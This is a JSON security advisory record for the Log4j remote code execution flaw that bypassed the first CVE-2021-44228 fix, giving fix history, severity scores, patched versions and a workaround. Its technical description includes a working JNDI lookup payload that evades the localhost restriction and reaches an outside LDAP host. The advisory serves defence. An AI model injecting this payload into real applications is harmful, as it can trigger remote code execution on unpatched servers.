{
    "source": "BDSA",
    "name": "BDSA-2021-3779",
    "title": "Apache Log4j Vulnerable to Remote Code Execution (RCE) via Non-Default Pattern Layout",
    "description": "Log4j is vulnerable to RCE. This vulnerability was discovered due to an incomplete fix for CVE-2021-44228. Under certain non-default log4j configurations, it is possible for an attacker to input malicious JNDI lookup patterns that will potentially result in a the execution of code.\n\nSuccessful attacks require the attacker to have access to Thread Context Map (MDC) input and log4j to use a non-default pattern layout with message lookups enabled.\n\nOnly the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability.\n\n**Note:** Previous mitigations involving configuration such as setting the system property `log4j2.noFormatMsgLookup` to `true` do NOT mitigate this specific vulnerability. This can lead to a bypass for the mitigation for CVE-2021-44228.",
    "technicalDescription": "Remote code execution (RCE) is possible in cases where a layout pattern is configured to use `${ctx:foo}` lookups and an attacker can supply the `ThreadContext` (Thread Context Map (MDC)) values. A payload such as `${jndi:ldap://127.0.0.1#bar.com:1234/a}` will be expanded recursively, resulting in attacker-controlled JNDI lookups.  \n\nAny previous mitigation or restriction of  Log4j JNDI LDAP lookups to localhost  can be bypassed using the mentioned payload.  This is possible due to the check performed using the `getHost` method [here](https://github.com/apache/logging-log4j2/blob/c30a1398a6697fb832c650870c44284d0052103e/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L218) will return the part before the `#` (`127.0.0.1`) which is allowed. But the JNDI resolver will resolve the full hostname and attempt to connect to the LDAP server.  \n\n[This](https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3) commit is the previous mitigation introduced in version **2.15.0-rc1** and is no longer deemed adequate protection against RCE.  \n\n[This](https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454) commit introduced in **2.15.0-rc1** disables message lookups by default, for an application to become vulnerable to RCE message lookups must be enabled. However, part of this commit uses a `try/catch` statement in the `lookup` method in `log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java`. This is intended to catch `URISyntaxException` exceptions. If an exception is thrown, the method will not return `null` and will instead perform a recursive call to `lookup`. This was disclosed as a denial-of-service (DoS) vulnerability. [This](https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658) commit in version **2.15.0-rc2** amended this issue.\n\nVersion **2.15.1-rc1** does disable JNDI lookups by default in [this](https://github.com/apache/logging-log4j2/commit/c362aff473e9812798ff8f25f30a2619996605d5) commit. However, message lookups have not been removed in this version. \n\n\nThis vulnerability has been fully mitigated by removing support for message lookup patterns and disabling JNDI functionality by default.",
    "publishedDate": "2021-12-15T12:43:36.635Z",
    "updatedDate": "2022-09-12T11:58:04.109Z",
    "disclosureDate": "2021-12-14T00:00:00.000Z",
    "exploitPublishDate": "2021-12-17T00:00:00.000Z",
    "solution": "Fixed in: \n* [**2.16.0-rc1**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1) by [this](https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d) commit.\n* [**2.12.2-rc1**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.12.2-rc1) by [this](https://github.com/apache/logging-log4j2/commit/70edc233343815d5efa043b54294a6fb065aa1c5) commit and [this](https://github.com/apache/logging-log4j2/commit/f819c83804152cb6ed94cb408302e36b21b65053) commit.\n* [**2.3.1-rc1**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.3.1-rc1) by [this](https://github.com/apache/logging-log4j2/commit/ce6b78d082aae89089cb3ad25cdd46e9ec70a70b) commit.\n\nThe latest stable releases can be found [here](https://github.com/apache/logging-log4j2/releases).\n\nNOTE: It is recommended to upgrade to version  [**2.17.0**](https://downloads.apache.org/logging/log4j/2.17.0/). This recommendation is due to related vulnerabilities affecting the version that this vulnerability is fixed in.",
    "severity": "HIGH",
    "cvss2": {
        "baseScore": 5.1,
        "impactSubscore": 6.4,
        "exploitabilitySubscore": 4.9,
        "severity": "MEDIUM",
        "accessVector": "NETWORK",
        "accessComplexity": "HIGH",
        "authentication": "NONE",
        "confidentialityImpact": "PARTIAL",
        "integrityImpact": "PARTIAL",
        "availabilityImpact": "PARTIAL",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 4.0
        },
        "vector": "(AV:N/AC:H/Au:N/C:P/I:P/A:P/E:POC/RL:OF/RC:C)"
    },
    "cvss3": {
        "baseScore": 8.1,
        "impactSubscore": 5.9,
        "exploitabilitySubscore": 2.2,
        "severity": "HIGH",
        "attackVector": "NETWORK",
        "attackComplexity": "HIGH",
        "confidentialityImpact": "HIGH",
        "integrityImpact": "HIGH",
        "availabilityImpact": "HIGH",
        "privilegesRequired": "NONE",
        "scope": "UNCHANGED",
        "userInteraction": "NONE",
        "temporalMetrics": {
            "exploitability": "PROOF_OF_CONCEPT",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 7.3
        },
        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "credit": "Kai Mindermann of iC Consult, and 4ra1n, Alvaro Mu\u00f1oz, M\u00e1rcio Almeida",
    "workaround": "The vendor states that:\n\n> This issue can be mitigated in prior releases (<**2.16.0**) by removing the JndiLookup class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).",
    "vendorFixDate": "2021-12-14T00:00:00.000Z",
    "vendorNotifiedDate": "2021-12-10T00:00:00.000Z",
    "bdsaTags": [
        "RCE"
    ],
    "overallScore": 7.3,
    "_meta": {
        "allow": [
            "GET"
        ],
        "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2021-3779",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro2.app.blackduck.com/api/cwes/CWE-502"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/CVE-2021-45046",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2021-3779/ranges"
            },
            {
                "rel": "reference",
                "href": "https://downloads.apache.org/logging/log4j/2.17.0/",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/advisories/GHSA-7rjr-3q55-vv33",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/blob/c30a1398a6697fb832c650870c44284d0052103e/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L218",
                "label": "LINK"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454",
                "label": "LINK"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/70edc233343815d5efa043b54294a6fb065aa1c5",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658",
                "label": "LINK"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/c362aff473e9812798ff8f25f30a2619996605d5",
                "label": "LINK"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3",
                "label": "LINK"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/ce6b78d082aae89089cb3ad25cdd46e9ec70a70b",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/f819c83804152cb6ed94cb408302e36b21b65053",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases/tag/log4j-2.12.2-rc1",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases/tag/log4j-2.3.1-rc1",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://issues.apache.org/jira/browse/LOG4J2-3221",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://logging.apache.org/log4j/2.x/security.html",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://logging.apache.org/log4j/2.x/security.html",
                "label": "WORKAROUND"
            },
            {
                "rel": "reference",
                "href": "https://twitter.com/marcioalm/status/1471742744347348997",
                "label": "POC"
            },
            {
                "rel": "reference",
                "href": "https://www.openwall.com/lists/oss-security/2021/12/14/4",
                "label": "ADVISORY"
            },
            {
                "rel": "default-remediation-status",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2021-3779/default-remediation-status"
            }
        ]
    }
}